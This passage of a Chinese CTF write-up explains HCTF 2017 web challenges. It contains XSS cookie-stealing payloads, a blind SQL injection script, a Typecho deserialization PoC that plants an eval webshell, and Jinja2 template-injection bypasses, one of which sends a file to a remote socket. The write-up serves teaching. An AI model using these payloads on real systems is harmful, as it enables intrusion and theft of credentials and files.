</code></pre><p>&#x5230;&#x4E86;&#x7B2C;&#x4E8C;&#x90E8;&#xFF0C;&#x81EA;&#x7136;&#x5C31;&#x662F;xss&#x4E86;&#xFF0C;&#x5176;&#x5B9E;&#x9898;&#x76EE;&#x672C;&#x8EAB;&#x975E;&#x5E38;&#x7B80;&#x5355;&#xFF0C;&#x5728;&#x51FA;&#x9898;&#x4E4B;&#x521D;&#xFF0C;&#x4E3A;&#x4E86;&#x907F;&#x514D;&#x9898;&#x76EE;&#x51FA;&#x73B0;&#x201C;&#x5783;&#x573E;&#x65F6;&#x95F4;&#x201D;&#xFF08;&#x56E0;&#x4E3A;&#x975E;&#x9884;&#x671F;&#x5BFC;&#x81F4;&#x9898;&#x76EE;&#x4E0D;&#x53EF;&#x89E3;&#xFF09;&#xFF0C;&#x6211;&#x5728;&#x9898;&#x76EE;&#x4E2D;&#x52A0;&#x5165;&#x4E86;&#x8DDF;&#x591A;&#x5143;&#x7D20;&#x3002;</p>
<p>&#x5E76;&#x628A;flag2&#x653E;&#x7F6E;&#x5728;<code>.2017.hctf.io</code>&#x57DF;&#x4E0B;&#xFF0C;&#x907F;&#x514D;&#x6709;&#x4EBA;&#x627E;&#x5230;messbox&#x7684;xss&#x4F46;&#x662F;&#x6253;&#x4E0D;&#x5230;flag&#x7684;&#x95EE;&#x9898;&#x3002;&#xFF08;&#x6CA1;&#x60F3;&#x5230;&#x771F;&#x7684;&#x7528;&#x4E0A;&#x4E86;&#xFF09;</p>
<p>&#x8FD9;&#x91CC;&#x6211;&#x5C31;&#x7B80;&#x5355;&#x63CF;&#x8FF0;&#x4E0B;&#x9884;&#x671F;&#x89E3;&#x6CD5;&#x548C;&#x975E;&#x9884;&#x671F;&#x89E3;&#x6CD5;&#x4E24;&#x4E2A;&#x3002;</p>
<h5 id="&#x9884;&#x671F;&#x89E3;&#x6CD5;"><a name="&#x9884;&#x671F;&#x89E3;&#x6CD5;" class="anchor-navigation-ex-anchor" href="#&#x9884;&#x671F;&#x89E3;&#x6CD5;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x9884;&#x671F;&#x89E3;&#x6CD5;" class="plugin-anchor" href="#&#x9884;&#x671F;&#x89E3;&#x6CD5;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x9884;&#x671F;&#x89E3;&#x6CD5;</h5>
<p>&#x9884;&#x671F;&#x89E3;&#x6CD5;&#x5F53;&#x7136;&#x6765;&#x81EA;&#x4E8E;&#x51FA;&#x9898;&#x601D;&#x8DEF;&#x3002;</p>
<p><a href="https://stamone-bug-bounty.blogspot.jp/2017/10/dom-xss-auth_14.html" target="_blank">https://stamone-bug-bounty.blogspot.jp/2017/10/dom-xss-auth_14.html</a></p>
<p>&#x6F0F;&#x6D1E;&#x672C;&#x8EAB;&#x975E;&#x5E38;&#x7B80;&#x5355;&#xFF0C;&#x4F46;&#x6709;&#x610F;&#x601D;&#x7684;&#x662F;&#x5229;&#x7528;&#x601D;&#x8DEF;&#x3002;</p>
<p><strong>&#x5F53;&#x4F60;&#x53D1;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;&#x4EFB;&#x610F;URL&#x8DF3;&#x8F6C;&#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x4F1A;&#x4E0D;&#x4F1A;&#x8003;&#x8651;&#x6F0F;&#x6D1E;&#x662F;&#x600E;&#x4E48;&#x53D1;&#x751F;&#x7684;&#xFF1F;</strong></p>
<p>&#x4E5F;&#x8BB8;&#x4F60;&#x5E73;&#x65F6;&#x53EF;&#x80FD;&#x6CA1;&#x6CE8;&#x610F;&#x8FC7;&#xFF0C;&#x4F46;&#x8DF3;&#x8F6C;&#x4E00;&#x822C;&#x662F;&#x5206;&#x4E24;&#x79CD;&#x7684;&#xFF0C;&#x7B2C;&#x4E00;&#x79CD;&#x662F;&#x670D;&#x52A1;&#x7AEF;&#x505A;&#x7684;&#xFF0C;&#x5229;&#x7528;<code>header: location</code>,&#x8FD9;&#x79CD;&#x8DF3;&#x8F6C;&#x6211;&#x4EEC;&#x6CA1;&#x529E;&#x6CD5;&#x963B;&#x6B62;&#x3002;&#x7B2C;&#x4E8C;&#x79CD;&#x662F;js&#x4F7F;&#x7528;<code>location.href</code>&#x5BFC;&#x81F4;&#x7684;&#x8DF3;&#x8F6C;&#x3002;</p>
<p>&#x65E2;&#x7136;&#x662F;js&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x90A3;&#x4E48;&#x662F;&#x4E0D;&#x662F;&#x6709;&#x53EF;&#x80FD;&#x5B58;&#x5728;dom xss&#x6F0F;&#x6D1E;&#x5462;&#xFF1F;</p>
<p>&#x8FD9;&#x4E2A;uber&#x7684;&#x6F0F;&#x6D1E;&#x7531;&#x6765;&#x5C31;&#x662F;&#x5982;&#x6B64;&#x3002;</p>
<p>&#x8FD9;&#x91CC;&#x552F;&#x4E00;&#x7684;&#x8003;&#x70B9;&#x5C31;&#x662F;&#xFF0C;js&#x662F;&#x4E00;&#x79CD;&#x987A;&#x5E8F;&#x6267;&#x884C;&#x7684;&#x8BED;&#x8A00;&#xFF0C;&#x5982;&#x679C;location&#x62A5;&#x9519;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4E0D;&#x4F1A;&#x7EE7;&#x7EED;&#x6267;&#x884C;&#x540E;&#x9762;&#x7684;js&#xFF0C;&#x5982;&#x679C;location&#x4E0D;&#x62A5;&#x9519;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x53EF;&#x80FD;&#x5728;&#x6267;&#x884C;&#x4E0B;&#x4E00;&#x53E5;&#x4E4B;&#x524D;&#x8DF3;&#x8F6C;&#x8D70;&#x3002;</p>
<p>&#x5F53;&#x7136;&#xFF0C;&#x529E;&#x6CD5;&#x5F88;&#x591A;&#x3002;&#x6700;&#x666E;&#x901A;&#x7684;&#x53EF;&#x80FD;&#x662F;&#x5728;location&#x540E;&#x4F7F;&#x7528;<code>stop()</code>&#x6765;&#x963B;&#x6B62;&#x8DF3;&#x8F6C;&#xFF0C;&#x4F46;&#x6700;&#x597D;&#x7528;&#x7684;&#x5C31;&#x662F;&#x65B0;&#x5EFA;script&#x5757;&#xFF0C;&#x8FD9;&#x6837;&#x4E0A;&#x4E00;&#x4E2A;script&#x62A5;&#x9519;&#x4E0D;&#x4F1A;&#x5F71;&#x54CD;&#x5230;&#x4E0B;&#x4E00;&#x4E2A;script&#x5757;&#x3002;</p>
<p>&#x6700;&#x7EC8;payload</p>
<pre><code>&lt;/script&gt;&lt;script src=&quot;http://auth.hctf.com/getmessage.php?callback=window.location.href=&apos;http://xxx?cookie=&apos;+document.cookie;//&quot;&gt;&lt;/script

exp

http://auth.2017.hctf.io/login.php?n_url=%3E%3C%2fscript%3E%3Cscript%20src%3D%22http%3A%2f%2fauth.2017.hctf.io%2fgetmessage.php%3Fcallback%3Dwindow.location.href%3D%27http%3A%2f%2fxxx%3Fcookie%3D%27%252bdocument.cookie%3B%2f%2f%22%3E%3C%2fscript%3E
</code></pre><h5 id="&#x975E;&#x9884;&#x671F;&#x89E3;&#x6CD5;"><a name="&#x975E;&#x9884;&#x671F;&#x89E3;&#x6CD5;" class="anchor-navigation-ex-anchor" href="#&#x975E;&#x9884;&#x671F;&#x89E3;&#x6CD5;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x975E;&#x9884;&#x671F;&#x89E3;&#x6CD5;" class="plugin-anchor" href="#&#x975E;&#x9884;&#x671F;&#x89E3;&#x6CD5;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x975E;&#x9884;&#x671F;&#x89E3;&#x6CD5;</h5>
<p>&#x9664;&#x4E86;&#x4E0A;&#x9762;&#x7684;&#x6F0F;&#x6D1E;&#x4EE5;&#x5916;&#xFF0C;messbox&#x4E5F;&#x6709;&#x6F0F;&#x6D1E;&#xFF0C;username&#x5728;&#x9996;&#x9875;&#x6CA1;&#x6709;&#x7ECF;&#x8FC7;&#x4EFB;&#x4F55;&#x8FC7;&#x6EE4;&#x5C31;&#x663E;&#x793A;&#x5728;&#x4E86;&#x9875;&#x9762;&#x5185;&#x3002;</p>
<p>&#x4F46;username&#x8FD9;&#x91CC;&#x6F0F;&#x6D1E;&#x4F1A;&#x6709;&#x4E00;&#x4E9B;&#x95EE;&#x9898;&#xFF0C;&#x56E0;&#x4E3A;&#x672C;&#x8EAB;&#x9884;&#x671F;&#x7684;&#x6F0F;&#x6D1E;&#x70B9;&#x5E76;&#x4E0D;&#x662F;&#x8FD9;&#x91CC;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x7684;username&#x7ECF;&#x8FC7;&#x6211;&#x6846;&#x67B6;&#x672C;&#x8EAB;&#x7684;&#x4E00;&#x70B9;&#x513F;&#x8FC7;&#x6EE4;&#xFF0C;&#x800C;&#x4E14;&#x957F;&#x5EA6;&#x6709;&#x9650;&#x5236;&#xFF0C;&#x6240;&#x4EE5;&#x4ECE;&#x8FD9;&#x91CC;&#x5229;&#x7528;&#x7684;&#x4EBA;&#x4F1A;&#x9047;&#x5230;&#x5F88;&#x591A;&#x975E;&#x9884;&#x671F;&#x7684;&#x95EE;&#x9898;&#x3002;</p>
<p>payload&#x5982;&#x4E0B;&#xFF0C;&#x6CE8;&#x518C;&#x540D;&#x4E3A;</p>
<pre><code>    &lt;script src=//auth.2017.hctf.io/getmessage.php?callback=location=%27http://xxx/%27%2bbtoa(document.cookie);//&gt;&lt;/script&gt;
</code></pre><p>&#x7684;&#x7528;&#x6237;&#x540D;&#xFF0C;&#x5E76;&#x83B7;&#x53D6;token&#x3002;</p>
<p>&#x4F20;&#x9012;</p>
<pre><code>    http://messbox.2017.hctf.io/?token=NDYyMGZlMTNhNWM3YTAxY3xQSE5qY21sd2RDQnpjb
    U05THk5aGRYUm9Makl3TVRjdWFHTjBaaTVwYnk5blpYUnRaWE56WVdkbExuQm9jRDlqWVd4c1ltR
    mphejFzYjJOaGRHbHZiajBsTWpkb2RIUndPaTh2Y205dmRHc3VjSGN2SlRJM0pUSmlZblJ2WVNoa
    2IyTjFiV1Z1ZEM1amIyOXJhV1VwT3k4dlBqd3ZjMk55YVhCMFBnPT0=
</code></pre><p>&#x5373;&#x53EF;</p>
<h3 id="sql-silencer"><a name="sql-silencer" class="anchor-navigation-ex-anchor" href="#sql-silencer"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.7. SQL Silencer</h3>
<p>&#x6709;&#x4E9B;&#x5047;&#x8FC7;&#x6EE4;&#xFF0C;&#x7B80;&#x5316;&#x4E00;&#x4E0B;&#x8D34;&#x51FA;&#x6CE8;&#x5165;&#x90E8;&#x5206;&#x6700;&#x91CD;&#x8981;&#x90E8;&#x5206;&#x7684;&#x4EE3;&#x7801;</p>
<pre><code>function sql_check($sql){
 if($sql &lt; 1 || $sql &gt; 3){
 die(&apos;We only have 3 users.&apos;);
 }

 $check = preg\_match(&apos;/&amp;|\_|\\+|or|,|and| |\\|\\||#|-|`|;|&quot;|\\&apos;|\\*|into|union(\[\\s\\S\]+)select(\[\\s\\S\]+)from/i&apos;,$sql);
 if( $check ){
 die(&quot;Nonono!&quot;);
 } else {
 return $sql;
 }
}
</code></pre><p>&#x8FD9;&#x9053;&#x9898;&#x5176;&#x5B9E;&#x662F;&#x53EF;&#x4EE5;&#x663E;&#x6CE8;&#x7684;&#xFF0C;&#x5404;&#x4F4D;&#x6709;&#x5174;&#x8DA3;&#x7684;&#x53EF;&#x4EE5;&#x5148;&#x53BB;&#x8BD5;&#x8BD5;<br>&#x7136;&#x800C;&#x7531;&#x4E8E;&#x662F;&#x9ED1;&#x540D;&#x5355;&#x4E0D;&#x5168;&#x7684;&#x539F;&#x56E0;&#xFF0C;&#x51E0;&#x4E4E;&#x6240;&#x6709;&#x961F;&#x4F0D;&#x90FD;&#x662F;&#x7528;&#x76F2;&#x6CE8;&#x505A;&#x51FA;&#x6765;&#x7684;<br>&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x6709;2&#x4E2A;&#x8868;&#xFF0C;&#x4E00;&#x4E2A;user&#xFF0C;&#x4E00;&#x4E2A;flag<br>user&#x8868;&#x91CC;&#x6709;3&#x6761;&#x6570;&#x636E;&#xFF0C;flag&#x8868;&#x91CC;&#x4E5F;&#x6709;2&#x6761;&#x6570;&#x636E;<br>&#x6240;&#x4EE5;&#x6709;&#x961F;&#x4F0D;&#x5728;&#x5B50;&#x67E5;&#x8BE2;&#x4E2D;&#x6D4B;&#x8BD5;select(flag)from(flag)&#x4F1A;&#x8FD4;&#x56DE;there is nothing&#x4ECE;&#x800C;&#x6000;&#x7591;flag&#x8868;&#x4E0D;&#x5B58;&#x5728;<br>&#x56E0;&#x4E3A;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x4F1A;&#x62A5;&#x9519;&#xFF1A;ERROR 1242 (21000): Subquery returns more than 1 row</p>
<p>&#x5148;&#x8BF4;&#x76F2;&#x6CE8;&#x5427;&#xFF0C;&#x7531;&#x4E8E;&#x5F88;&#x591A;&#x51FD;&#x6570;&#x90FD;&#x6CA1;&#x7981;&#x7528;&#xFF0C;&#x76F2;&#x6CE8;&#x7684;&#x65B9;&#x6CD5;&#x6709;&#x5F88;&#x591A;&#xFF0C;&#x968F;&#x4FBF;&#x8D34;&#x4E00;&#x4E2A;<br>&#x7531;&#x4E8E;3^1=2 -&gt; Bob ,3^2=1 -&gt; Alice, 3^0 -&gt; Cc<br>&#x770B;flag&#x8868;&#x4E2D;&#x6709;&#x591A;&#x5C11;&#x884C;</p>
<p>   <code>id=3^(select(count(flag))from(flag))</code></p>
<p>&#x8FD4;&#x56DE;Alice&#xFF0C;&#x786E;&#x5B9A;flag&#x8868;&#x4E2D;&#x53EA;&#x6709;2&#x6761;&#x6570;&#x636E;<br>&#x8DD1;flag&#x7684;poc:</p>
<pre><code>`id=3^(select(count(1))from(flag)where(binary(flag)&lt;0x30))`
</code></pre><p>&#x5199;&#x811A;&#x672C;&#x76F4;&#x63A5;&#x8DD1;&#x5C31;&#x80FD;&#x8DD1;&#x51FA;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;&#x540D;&#xFF0C;&#x7531;&#x4E8E;flag&#x8868;&#x91CC;&#x4E2D;&#x7B2C;&#x4E00;&#x6761;&#x6570;&#x636E;&#x662F;&#x6CA1;&#x5565;&#x7528;&#x7684;&#x3002;&#x7ED9;&#x505A;&#x9898;&#x5E08;&#x5085;&#x4EEC;&#x5E26;&#x6765;&#x4E86;&#x4E9B;&#x56F0;&#x6270;&#xFF0C;&#x6709;&#x4E9B;&#x62B1;&#x6B49;&#x3002;</p>
<pre><code>#!/usr/bin/env python
\# -*- coding:utf-8 -*- 
\# author = &apos;c014&apos;

import requests

s = requests.session()
flag = &quot;&quot;

for i in xrange(100):
    for j in range(33,128):
        url = &quot;http://sqls.2017.hctf.io/index/index.php?id=3^(select(count(1))from(flag)where(binary(flag)&lt;0x{}))&quot;.format((flag+chr(j)).encode(&apos;hex&apos;))
        r = s.get(url)
        if &apos;Cc&apos; not in r.text:
            flag = flag + chr(j-1)
            print &apos;\[+\]flag:&apos;+flag
            break
</code></pre><p>&#x8DD1;&#x51FA;&#x76EE;&#x5F55;&apos;./H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017/&apos;&#x540E;&#x8BBF;&#x95EE;/index/H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017/index.php&#x53D1;&#x73B0;&#x642D;&#x7684;&#x662F;typecho<br>&#x53EF;&#x4EE5;&#x62FF;&#x524D;&#x6BB5;&#x65F6;&#x95F4;&#x7684;Typecho&#x524D;&#x53F0;getshell&#x6F0F;&#x6D1E;&#x76F4;&#x63A5;&#x6253;<br>&#x6709;&#x4E24;&#x79CD;&#x65B9;&#x6CD5;&#xFF0C;&#x4E00;&#x79CD;&#x662F;&#x76F4;&#x63A5;&#x56DE;&#x663E;&#x547D;&#x4EE4;&#x6267;&#x884C;&#xFF0C;&#x53E6;&#x4E00;&#x79CD;&#x662F;&#x4E0A;&#x4F20;shell<br>&#x7531;&#x4E8E;&#x6839;&#x76EE;&#x5F55;&#x4E00;&#x822C;&#x4E0D;&#x4F1A;&#x6709;&#x53EF;&#x5199;&#x6743;&#x9650;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x51C6;&#x5907;&#x4E86;&#x4E00;&#x4E2A;uploads&#x76EE;&#x5F55;&#xFF0C;&#x5E76;&#x4E14;&#x5B58;&#x5728;.DS_Store&#x6CC4;&#x9732;<br>&#x76F4;&#x63A5;&#x6253;&#x7684;poc&#x4E3A;&#xFF1A;</p>
<pre><code>    Url: http://sqls.2017.hctf.io/index/H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017/install.php?finish
    Post: __typecho_config=YTo3OntzOjQ6Imhvc3QiO3M6OToibG9jYWxob3N0IjtzOjQ6InVzZXIiO3M6NjoieHh4eHh4IjtzOjc6ImNoYXJzZXQiO3M6NDoidXRmOCI7czo0OiJwb3J0IjtzOjQ6IjMzMDYiO3M6ODoiZGF0YWJhc2UiO3M6NzoidHlwZWNobyI7czo3OiJhZGFwdGVyIjtPOjEyOiJUeXBlY2hvX0ZlZWQiOjM6e3M6MTk6IgBUeXBlY2hvX0ZlZWQAX3R5cGUiO3M6NzoiUlNTIDIuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6NTp7czo0OiJsaW5rIjtzOjE6IjEiO3M6NToidGl0bGUiO3M6MToiMiI7czo0OiJkYXRlIjtpOjE1MDc3MjAyOTg7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fXM6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fX19fXM6MTA6ImRhdGVGb3JtYXQiO047fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9
    Referer: http://sqls.2017.hctf.io/index/H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017/install.php?finish=
</code></pre><p>&#x6839;&#x636E;&#x9700;&#x6C42;&#x4FEE;&#x6539;base64&#x5185;&#x5BB9;&#x5373;&#x53EF;<br>&#x4E0A;&#x4F20;shell&#x7684;poc&#x4E3A;&#xFF1A;</p>
<pre><code>    Url: http://sqls.2017.hctf.io/index/H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017/install.php?finish
    Cookie: __typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjY6ImZpbGVfcHV0X2NvbnRlbnRzKCd1cGxvYWRzL2MwMTQucGhwJywgJzw/cGhwIEBldmFsKCRfUE9TVFtjXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ==
    Referer: http://sqls.2017.hctf.io/index/H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017/install.php
</code></pre><p>&#x5373;&#x53EF;&#x5728;uploads&#x76EE;&#x5F55;&#x4E0B;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;c014.php&#x7684;webshell<br>&#x4E4B;&#x540E;&#x4F1A;&#x53D1;&#x73B0;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x51FD;&#x6570;&#x597D;&#x50CF;&#x90FD;&#x6CA1;&#x6709;&#x56DE;&#x663E;&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x57FA;&#x672C;&#x4E0A;&#x90FD;&#x7981;&#x7528;&#x6389;&#x4E86;<br>&#x8FD9;&#x91CC;&#x7528;php&#x81EA;&#x5E26;&#x7684;&#x5217;&#x76EE;&#x5F55;</p>
<pre><code>$c = new DirectoryIterator(&quot;glob:///*&quot;);
foreach($c as $cc) {
 echo $cc,&quot;&lt;/br&gt;&quot;;
}
</code></pre><p>&#x53D1;&#x73B0;&#x6839;&#x76EE;&#x5F55;&#x4E0B;&#x6709;&#x4E2A; /flag_is_here &#x7684;&#x6587;&#x4EF6;&#x5939;<br>&#x7136;&#x540E;&#x8BFB;&#x53D6;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x5939;&#x4E0B;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6709;&#x4E00;&#x4E2A;flag&#x6587;&#x4EF6;</p>
<p>echo file_get_contents(&apos;/flag_is_here/flag&apos;);</p>
<p>get flag~</p>
<p>&#x8FD9;&#x9898;&#x6211;&#x4E00;&#x5F00;&#x59CB;&#x662F;&#x60F3;&#x8003;&#x663E;&#x6CE8;&#x7ED5;&#x8FC7;waf</p>
<pre><code>`/union([\s\S]+)select([\s\S]+)from/i`
</code></pre><p>&#x8D34;&#x4E00;&#x4E0B;&#x6211;&#x9884;&#x671F;&#x7684;&#x663E;&#x6CE8;poc</p>
<pre><code>`id=1=2|@c:=(select(1))union(select@c)`
</code></pre><p>&#x8BFB;&#x76EE;&#x5F55;&#x7684;exp&#x4E3A;:</p>
<pre><code>`id=1=2|@c:=(select(flag)from(flag)where(flag&lt;0x30))union(select@c)`
</code></pre><h3 id="repeater"><a name="repeater" class="anchor-navigation-ex-anchor" href="#repeater"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.8. Repeater</h3>
<p>&#x9898;&#x76EE;&#x662F;&#x6839;&#x636E;<a href="https://0day.work/jinja2-template-injection-filter-bypasses/" target="_blank">&#x539F;&#x6587;</a>&#x9B54;&#x6539;&#x7684;<br>&#x6253;&#x5F00;&#x9898;&#x76EE;F12&#x53D1;&#x73B0;server&#x4E3A;</p>
<p>   <code>Server: Werkzeug/0.12.2 Python/2.7.12</code></p>
<p>&#x7136;&#x540E;&#x53D1;&#x73B0;&#x8F93;&#x5165;x&#x5C31;&#x8FD4;&#x56DE;x was not found.<br>&#x5DEE;&#x4E0D;&#x591A;&#x53EF;&#x4EE5;&#x60F3;&#x5230;jinja&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x95EE;&#x9898;<br>&#x6D4B;&#x8BD5;</p>
<p>   <code>secret={{2-1}}</code></p>
<p>&#x8FD4;&#x56DE;1 was not found.&#x5373;&#x53EF;&#x9A8C;&#x8BC1;<br>&#x7531;&#x4E8E;&#x4E5F;&#x662F;&#x9ED1;&#x540D;&#x5355;&#x8FC7;&#x6EE4;&#xFF0C;&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F;&#x770B;&#x5E08;&#x5085;&#x4EEC;&#x7684;&#x59FF;&#x52BF;<br>request.args&#x8FC7;&#x6EE4;&#x4E86;</p>
<p>   <code>&#x7A7A;&#x683C;(%20)&#xFF0C;&#x56DE;&#x8F66;(%0a)&#xFF0C;&apos;__&apos;,&apos;[&apos;,&apos;]&apos;,&apos;os&apos;,&apos;&quot;&apos;,&quot;|[a-z]&quot;</code></p>
<p>&#x76F4;&#x63A5;&#x6784;&#x9020;&#x662F;&#x53EF;&#x4EE5;bypass&#x7684;<br>&#x7A7A;&#x683C;&#x53EF;&#x4EE5;&#x7528;tab(%09)&#x7ED5;&#x8FC7;&#xFF0C;|&#x540E;&#x4E0D;&#x5141;&#x8BB8;&#x63A5;a-z&#x53EF;&#x4EE5;&#x7528;%0c&#xFF0C;tab&#x7B49;&#x7ED5;&#x8FC7;&#xFF0C;os&#x53EF;&#x4EE5;&#x901A;&#x8FC7;python&#x4E2D;exec&#x7ED5;&#x8FC7;<br>&#x4F46;&#x662F;&#x8FD9;&#x9898;&#x8FC7;&#x6EE4;&#x4EC5;&#x9650;&#x4E8E;request.args&#x4F46;&#x662F;&#x4E0D;&#x5141;&#x8BB8;post<br>&#x7B80;&#x5355;&#x7684;&#x529E;&#x6CD5;&#x662F;&#x53EF;&#x4EE5;&#x7528;request.cookies&#x6765;&#x7ED5;&#x8FC7;<br>&#x53EA;&#x80FD;&#x8BFB;&#x6587;&#x4EF6;&#x7684;&#x65B9;&#x6CD5;&#x8981;&#x627E;flag&#x9996;&#x5148;&#x9700;&#x8981;&#x5148;&#x5230;/etc/passwd&#x770B;&#x5230;&#x6709;hctf&#x7528;&#x6237;,&#x7136;&#x540E;&#x8BFB;&#x53D6;/home/hctf/.bash_history,&#x53D1;&#x73B0;flag&#x8DEF;&#x5F84;/h3h3_1s_your_flag/flag,&#x5728;&#x8BFB;&#x53D6;flag<br>&#x968F;&#x4FBF;&#x5217;&#x51E0;&#x79CD;&#x89E3;&#x9898;&#x65B9;&#x6CD5;<br>1.&#x4E0D;&#x7528;blask_list&#x91CC;&#x7684;&#x7B26;&#x53F7;</p>
<pre><code>    secret={%set%0ca,b,c,d,e,f,g,h,i=request|%0cattr(request.args.class|%0cformat(request.args.a,request.args.a,request.args.a,request.args.a))|%0cattr(request.args.mro|%0cformat(request.args.a,request.args.a,request.args.a,request.args.a))%}{{(i|%0cattr(request.args.subc|%0cformat(request.args.a,request.args.a,request.args.a,request.args.a))()).pop(40)(request.args.file,request.args.write).write(request.args.payload)}}{{config.from_pyfile(request.args.file)}}&amp;class=%s%sclass%s%s&amp;mro=%s%smro%s%s&amp;subc=%s%ssubclasses%s%s&amp;usc=_&amp;file=/tmp/foo.py&amp;write=w&amp;a=_&amp;payload=import%0csocket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&apos;xxx.xxx.xxx.xxx&apos;,2333));s.send(open(&apos;/h3h3_1s_your_flag/flag&apos;).read());
</code></pre><p>2.exec&#x6784;&#x9020;&#x7ED5;&#x8FC7;&apos;os&apos;&#x6267;&#x884C;os&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;</p>
<pre><code>`a=&apos;import\x0co&apos;+&apos;s;o&apos;+&apos;s.system(\&apos;ls${IFS}/\&apos;)&apos;;exec(a)`
</code></pre><p>3.&#x901A;&#x8FC7;request.cookies</p>
<pre><code>    Url: http://repeater.2017.hctf.io/?secret={{request|%0cattr(request.cookies.class)|%0cattr(request.cookies.mro)|%0clast()|%0cattr(request.cookies.sub)()|%0cattr(request.cookies.getitem)(40)(request.cookies.file)|%0cattr(request.cookies.read)()}}
    Cookie: file=/h3h3_1s_your_flag/flag;class=__class__;mro=__mro__;sub=__subclasses__;getitem=__getitem__;read=read;
</code></pre><h3 id="who-are-you"><a name="who-are-you" class="anchor-navigation-ex-anchor" href="#who-are-you"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.9. Who are you?</h3>
<p>&#x8FDB;&#x5165;&#x754C;&#x9762;&#xFF0C;&#x53F3;&#x4E0A;&#x767B;&#x5F55;&#xFF0C;Steam &#x8D26;&#x53F7;&#x6388;&#x6743;&#x3002;</p>
<p>&#x7136;&#x540E;&#x8FDB;<code>Home</code>&#x53D1;&#x73B0;&#x6709;<code>infomation</code>&#x548C;<code>shop</code>&#x3002;<code>shop</code>&#x91CC;&#x53EF;&#x4EE5;&#x4E70;flag&#x63A8;&#x6D4B;&#x4F46;&#x663E;&#x793A;&#x4F59;&#x989D;&#x4E0D;&#x8DB3;&#x3002;</p>
<p>&#x8D2D;&#x4E70;&#x52A8;&#x4F5C;&#x7684;URL&#x4E3A;<code>http://gogogo.2017.hctf.io/shop/3</code>&#xFF0C;&#x4FEE;&#x6539;3&#x4E3A;4&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x8C03;&#x8BD5;&#x6A21;&#x5F0F;&#x6CA1;&#x5173;&#xFF0C;&#x6E90;&#x7801;&#x6CC4;&#x9732;&#x3002;</p>
<pre><code>    public function buy(Request $request)
        {
            $itemId = $request-&gt;route(&apos;id&apos;);
            $item = Item::find($itemId);
            $prize = $item-&gt;prize;
            $balance = Info::find(Auth::id())-&gt;amount;
            if ($balance &gt;= $prize) {
                return view(&apos;message&apos;, [&apos;message&apos; =&gt; $item-&gt;note]);
            }

            return view(&apos;message&apos;, [&apos;message&apos; =&gt; &apos;Sorry Sir! You don\&apos;t have enough money&apos;]);
        }
</code></pre><p>&#x5F97;&#x77E5;&#x540E;&#x7AEF;&#x6846;&#x67B6;&#x4E3A; <code>Laravel</code>&#xFF0C;&#x8D26;&#x6237;&#x4F59;&#x989D;&#x5B57;&#x6BB5;&#x540D;&#x4E3A;<code>amount</code>&#x3002;</p>
